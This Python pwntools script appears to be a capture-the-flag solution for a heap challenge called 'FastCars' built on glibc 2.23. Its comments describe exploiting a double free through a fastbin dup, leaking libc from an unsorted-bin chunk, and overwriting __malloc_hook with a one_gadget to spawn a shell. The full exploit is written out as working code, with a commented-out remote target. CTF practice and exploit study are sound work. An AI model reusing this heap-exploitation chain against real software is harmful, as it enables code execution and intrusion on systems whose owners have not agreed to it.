#!/usr/bin/env python3
#A standard heap note chall with options to malloc(buy car),free(sell car),read(view car)
#There is no option to edit which means use after free is not here..
#If we sell a car twice ..We can see there is double free error ...
#There is a double free bug which we can use it to make a fastbin dup attack.
#In the buy car we can purchase three cars ..
#Each has different size chunks allocated..
#One is normal size chunk that when freed goes to unsorted bin and which gives us libc leak
#The other two are small size chunks which when freed goes to fastbins ..
#One of the fastbin sized chunk is 0x70 which we can use to overwrite malloc hook
#Because of the presence of fake 0x7f size field 


from pwn import * 


e = ELF("./FastCars_patched")
r = process("./FastCars_patched")
#r = remote("gc1.eng.run",31272)
libc = ELF("./libc-2.23.so")

def malloc_small(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"1") 
    r.sendlineafter(b"Model of Car:",data)


def malloc_medium(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Model of Car:",data)

def malloc_large(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Model of Car:",data)


def free(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Index:",f"{index}")


def read_libc(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Index:",f"{index}")
    r.recvuntil(b"Model:")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return leak


malloc_large(b"A"* 10)
malloc_small(b"B" * 10)
free(0)
libc_leak = read_libc(0)
libc_base = libc_leak - libc.sym["main_arena"] - 88
log.info("The libc base of the process is " + hex(libc_base))
malloc_large(b"C")
malloc_medium(b"D")
malloc_medium(b"E")
free(3)
free(4)
free(3)
malloc_hook = libc_base + libc.sym["__malloc_hook"] - 35
malloc_medium(p64(malloc_hook))
malloc_medium(b"F" * 8)
malloc_medium(b"G" * 8)
malloc_medium(b"A" * 19 + p64(libc_base + 0xf03a4)  + b"\x00" * 48)
r.sendlineafter(b">",b"1")
r.sendlineafter(b">",b"2")
r.interactive()